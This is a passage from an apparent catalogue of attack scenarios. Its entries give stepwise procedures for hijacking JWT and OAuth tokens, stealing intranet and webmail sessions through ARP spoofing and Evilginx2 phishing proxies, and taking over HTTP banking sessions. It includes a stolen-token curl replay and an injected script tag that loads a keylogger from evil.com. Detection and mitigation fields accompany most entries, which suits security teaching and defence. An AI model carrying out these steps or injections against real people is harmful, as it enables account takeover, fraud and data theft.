Attack Steps: Step 1: Target is a web or mobile app that uses token-based authentication like OAuth2 or JWT stored in localStorage, sessionStorage, or accessible cookies. Step 2: Attacker finds XSS vulnerability or MITM opportunity (e.g., via public Wi-Fi or insecure API endpoint). Step 3: Injects script to exfiltrate tokens or sniffs JWT from Authorization header in intercepted API request. Step 4: Attacker copies the token, opens Postman or curl, and makes a request like: curl -H "Authorization: Bearer <stolen_token>" https://api.target.com/profile. Step 5: Backend server validates token and responds as if request came from the real user. Step 6: Attacker can read/update private data, perform transactions, or elevate access if token has admin claims. Step 7: Defender may not detect if token is valid and attacker mimics legitimate IP/User-Agent. Step 8: Attacker repeats until token expires or refresh token is used to generate new one.
Impact: Full API access, impersonation, data theft
Detection Method: Monitor for token reuse from new IPs; analyze token issuance and refresh anomalies
Solution: Store tokens securely; use short token lifetimes; rotate secrets; implement refresh token limits
Tags: JWT, OAuth, Token Hijack, API Abuse

Title: Hijack Intranet or HR Portal Session
Scenario Description: Attacker steals internal user session (HR, payroll, intranet) to access private company data or escalate privileges.
Tools Used: Responder, Wireshark, Evilginx2, ARP Spoof tools
Attack Steps: Step 1: Victim accesses internal HR or payroll system from corporate device (e.g., http://hr.company.local) using session cookies. Step 2: Attacker is on same network (e.g., guest Wi-Fi, misconfigured VLAN, insider). Step 3: Uses ARP spoofing via Bettercap, Ettercap, or Responder to position as MITM. Step 4: Captures HTTP traffic (many internal apps don't enforce HTTPS internally). Step 5: Extracts session cookies or auth headers (Cookie, Authorization) using Wireshark or logs. Step 6: Attacker sets these in browser dev tools or API tools (Postman). Step 7: Gains access to payroll, employee data, financial docs. Step 8: May automate access using scripts if session remains valid. Step 9: Detection is tough unless IP restrictions, geo-based login checks, or behavioral analysis are enabled. Step 10: Mitigation involves enforcing HTTPS everywhere, logging internal session use, and using short session TTLs.
Vulnerability: Lack of HTTPS, long session validity
Detection Method: Monitor login sessions from unknown IPs; inspect internal HTTP traffic for auth leakage
Solution: Enforce HTTPS on internal apps; use device certs; set low session timeouts

Title: Access Webmail (e.g., Outlook, Gmail)
Attack Type: Session Hijack via Cookies or Token Capture
Scenario Description: Attacker gains access to a user's email session, enabling full access to emails, reset links, and sensitive communications.
Tools Used: Evilginx2, Browser Dev Tools, MITMproxy, SSLstrip
Attack Steps: Step 1: Attacker sets up Evilginx2 phishing framework that proxies login pages of Gmail, Outlook, or other webmail. Step 2: Sends phishing email or link pointing to fake login page. Step 3: Victim visits the page and enters real credentials. Step 4: Evilginx proxies the login, captures credentials and the session cookies or auth tokens (e.g., Google SID, MSAuth1.0). Step 5: Attacker copies stolen cookie to their browser → opens webmail site. Step 6: Pastes session cookie via dev tools → gains access to live user mailbox with no 2FA prompt. Step 7: Attacker can read, send emails, access password reset links, or exfiltrate data. Step 8: Defender detection is hard unless session binding (IP/user-agent) or conditional access is enforced. Step 9: Victim may not notice unless session is revoked. Step 10: Mitigation involves strong phishing protection, cookie binding to device/IP, and short auth token TTLs.
Vulnerability: Session cookie theft, phishing proxy tools
Detection Method: Analyze email access logs for anomalous IPs; monitor suspicious session reuse
Solution: Enable 2FA, session IP pinning, detect proxy use, invalidate session on re-login

Title: Hijack Banking Sessions (over HTTP)
Scenario Description: Attacker takes over banking sessions that use insecure HTTP instead of encrypted HTTPS.
Tools Used: Wireshark, Ettercap, Bettercap, Browser Dev Tools
Attack Steps: Step 1: Attacker connects to same public Wi-Fi (e.g., café or airport) as victim. Step 2: Starts MITM attack using Ettercap or Bettercap to sniff HTTP traffic. Step 3: Victim logs into online banking site over HTTP (no HTTPS lock icon). Step 4: Attacker captures the Cookie or Authorization header using Wireshark. Step 5: Attacker opens banking site in browser → opens Dev Tools → goes to Application → Cookies → pastes the stolen session ID. Step 6: Refreshes the page → now logged into victim's bank account. Step 7: Can initiate transactions, change passwords, or extract personal data. Step 8: May remain undetected if victim still sees active session. Step 9: No alert triggered unless bank uses IP-based session tracking.
Vulnerability: Use of unencrypted HTTP session cookies
Detection Method: Detect sessions from different geo/IPs; monitor unusual transactions
Solution: Enforce HTTPS-only access; implement secure cookie flags; bind sessions to device/IP

Title: Modify Active Web Pages
Scenario Description: Attacker modifies live web content in victim’s browser to inject malicious scripts, ads, or fake inputs.
Attack Steps: Step 1: Victim is using a website (any domain without HTTPS or with mixed content). Step 2: Attacker performs ARP spoofing via Bettercap to position as MITM. Step 3: Sets up mitmproxy or Burp Suite in intercept mode. Step 4: As victim browses, attacker modifies the HTML page in transit. For example: → Injects <script src="http://evil.com/keylogger.js"> in the response. → Replaces advertisement scripts with their own click-fraud code.
